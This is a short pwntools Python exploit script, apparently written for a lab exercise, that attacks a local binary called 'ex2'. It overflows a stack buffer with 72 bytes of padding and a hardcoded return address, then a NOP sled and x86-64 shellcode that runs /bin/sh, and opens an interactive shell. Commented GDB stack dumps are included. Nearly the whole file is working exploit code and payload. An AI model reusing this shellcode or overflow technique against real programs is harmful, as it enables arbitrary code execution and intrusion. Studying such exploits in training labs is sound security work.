#!/usr/bin/python
from pwn import *
import os

path = os.getcwd()              # Root path
bin_name = "ex2"                # Binary name
prog = path + "/" + bin_name    # Full path

p = process(prog) 

'''
ret_addr = p64(0xdeadbeefcafebabe)
shellcode = "\xCC" * 48
'''

offset = "A" * 72
ret_addr = p64(0x7fffffffe460)
nop_sled = "\x90" * 48
shellcode = "\x48\x31\xc0\x48\x31\xd2\x50\x50\xc7\x04\x24\x2f\x62\x69\x6e\xc7\x44\x24\x04\x2f\x2f\x73\x68\x48\x89\xe7\x50\x57\x48\x89\xe6\x04\x3b\x0f\x05"

'''
In this case $rsp usually means return address

0x00007fffffffe448+0x0000: 0xdeadbeefcafebabe    $rsp
0x00007fffffffe450+0x0008: 0xcccccccccccccccc
0x00007fffffffe458+0x0010: 0xcccccccccccccccc
0x00007fffffffe460+0x0018: 0xcccccccccccccccc
0x00007fffffffe468+0x0020: 0xcccccccccccccccc
0x00007fffffffe470+0x0028: 0xcccccccccccccccc
0x00007fffffffe478+0x0030: 0xcccccccccccccccc
'''

bof = ''
bof += offset
bof += ret_addr 
bof += nop_sled
bof += shellcode

msg = "Payload : " + str(len(bof)) + " bytes"
log.warn(msg)

raw_input(str(p.proc.pid))  # For GDB
p.sendline(bof)             # Sends crafted input to program

log.success("Shell popped!")
p.interactive()             # After shell is popped, passes control back to user
